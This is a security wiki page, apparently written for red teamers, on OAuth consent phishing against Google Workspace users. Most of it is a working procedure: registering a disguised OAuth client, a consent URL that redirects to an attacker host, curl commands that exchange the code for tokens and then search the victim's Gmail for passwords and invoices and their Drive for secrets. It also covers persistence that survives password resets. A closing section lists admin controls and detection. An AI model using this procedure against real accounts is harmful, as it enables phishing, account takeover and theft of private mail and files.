---
title: GCP OAuth app abuse
slug: gcp-oauth-app-abuse
---

> **TL;DR:** Trick a Google Workspace user into consenting to a third-party OAuth app that requests broad Gmail/Drive/Calendar scopes; refresh-token persists across password resets and MFA, surviving long after the user notices.

## What it is
Google OAuth 2.0 lets third-party apps request scoped access to a user's account via a consent screen. Once consented, the app receives an access token plus a refresh token good for ~6 months (or until revoked). Attackers register an OAuth client in their own GCP project, request high-value scopes (`gmail.readonly`, `drive`, `calendar`, `cloud-platform`), and phish the user to the legitimate `accounts.google.com/o/oauth2/v2/auth` URL — a real Google page — to consent. The token then operates server-side, invisible to endpoint controls, and survives password resets because refresh tokens are not invalidated on password change unless the user manually removes the app.

## Preconditions / where it applies
- Attacker can register a GCP project + OAuth client (any free Google account).
- Target user is reachable via phish (email, chat, malicious site).
- Workspace admin has not restricted third-party app access in the admin console.
- Useful scopes are still grantable without verification — Google requires app verification for sensitive/restricted scopes, but unverified apps can still consent (with a scary warning) for tiny user counts.

## Technique
**Set up the client:**

1. In a throwaway GCP project, create an OAuth 2.0 Client (Web), set redirect URI to a server you control.
2. On the consent screen, choose a benign brand name and icon (e.g. "Calendar Sync Helper").
3. Add scopes — start with non-sensitive (`profile`, `email`) and one sensitive (`gmail.readonly` or `drive.readonly`); more scopes trigger more friction.

**Build the consent URL:**

```
https://accounts.google.com/o/oauth2/v2/auth?
  client_id=YOUR.apps.googleusercontent.com
  &redirect_uri=https://attacker.tld/callback
  &response_type=code
  &access_type=offline
  &prompt=consent
  &scope=https://www.googleapis.com/auth/gmail.readonly%20https://www.googleapis.com/auth/userinfo.email
```

`access_type=offline` is what makes Google issue a refresh token alongside the access token.

**Exchange code for tokens:**

```bash
curl -X POST https://oauth2.googleapis.com/token \
  -d "code=$CODE&client_id=$CID&client_secret=$CS&redirect_uri=$RU&grant_type=authorization_code"
```

The response includes `access_token` (~1h) and `refresh_token` (~months). Store the refresh token; refresh on demand.

**Operate as the user:**

```bash
curl -H "Authorization: Bearer $AT" \
  "https://gmail.googleapis.com/gmail/v1/users/me/messages?q=password+OR+invoice"
curl -H "Authorization: Bearer $AT" \
  "https://www.googleapis.com/drive/v3/files?q=name+contains+'secret'"
```

**Persistence:** the refresh token survives password change. It dies only if (a) user revokes the app in `myaccount.google.com/permissions`, (b) admin removes the app from Workspace, or (c) token is unused for 6 months. Compare to [[az-cli-tokens]] for the Azure analogue.

**Restricted-scope alternative:** for unverified Workspace tenants, the consent screen says "Google hasn't verified this app" — surprisingly often clicked through. For verified scopes (`gmail`, full `drive`), Google's app-verification process is the real bar.

## Detection and defence
- Workspace Admin → Security → API controls → "Restrict third-party app access" → allow only verified or allow-listed apps.
- Audit `Login` and `Token` events in Workspace audit log; alert on `oauth2_authorize` events with new client IDs.
- For GCP itself, block `https://www.googleapis.com/auth/cloud-platform` scope on consumer accounts.
- User education: the consent screen URL is real Google — phish detection won't trigger; train on the scope-list.
- Run app-access reports and clean unused third-party app grants quarterly.

## References
- [Google — OAuth 2.0 scopes](https://developers.google.com/identity/protocols/oauth2/scopes) — scope catalog
- [Google Workspace — API access controls](https://support.google.com/a/answer/7281227) — admin restrictions
- [HackTricks Cloud — GCP OAuth abuse](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-services/gcp-iam-and-org-policies-enum.html) — workspace pivots
